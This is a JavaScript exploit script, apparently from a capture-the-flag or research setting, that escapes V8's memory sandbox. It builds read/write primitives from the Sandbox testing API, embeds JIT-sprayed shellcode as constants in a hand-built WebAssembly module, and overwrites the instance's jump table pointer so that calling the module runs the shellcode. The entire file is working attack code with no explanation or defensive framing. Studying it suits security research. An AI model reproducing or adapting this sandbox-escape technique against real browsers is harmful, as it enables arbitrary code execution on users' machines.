/* constants */

const jump_table_start_offset = 0x48; // offset of jump_table_start in WasmInstanceObject
const shellcode_offset = 0x81a; // offset of shellcode from call target address


/* helpers */

// convert integer into hex string
function hex(i) { return `0x${i.toString(16)}`; }


/* implement sandboxed exploit primitives */

// obtain address of obj
function addrof(obj) { return Sandbox.getAddressOf(obj); }

// arbitrary address read / write
function rw_sbx(addr, value = NaN) {
  let view = new DataView(new Sandbox.MemoryView(addr, 8));

  if (Number.isNaN(value)) { // read
    return view.getBigUint64(0, true);
  } else { // write
    view.setBigUint64(0, value, true);
  }
}


/* escape v8 sandbox */

// create wasm module
let src = [0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 96, 1, 94, 0, 66, 200, 226, 252, 135, 137, 146, 228, 245, 2, 66, 191, 223, 204, 195, 134, 128, 228, 245, 2, 66, 200, 130, 159, 135, 130, 146, 228, 245, 2, 66, 200, 226, 216, 135, 137, 146, 228, 245, 2, 66, 190, 223, 136, 203, 230, 141, 228, 245, 2, 66, 200, 130, 220, 191, 133, 146, 228, 245, 2, 66, 200, 146, 158, 199, 148, 198, 253, 245, 2, 66, 200, 226, 200, 198, 148, 134, 240, 245, 2, 66, 176, 247, 188, 168, 176, 152, 164, 200, 144, 127, 15, 11]; // wat2wasm pwn.wat
let module = new WebAssembly.Module(new Uint8Array(src));
let instance = new WebAssembly.Instance(module);

// execute shellcode
let instance_addr = addrof(instance);
console.log(`[+] instance_addr == ${hex(instance_addr)}`);
let jump_table_start = rw_sbx(instance_addr + jump_table_start_offset);
console.log(`[+] jump_table_start == ${hex(jump_table_start)}`);
rw_sbx(instance_addr + jump_table_start_offset, jump_table_start + BigInt(shellcode_offset)); // overwrite jump_table_start with shellcode address
instance.exports.main();
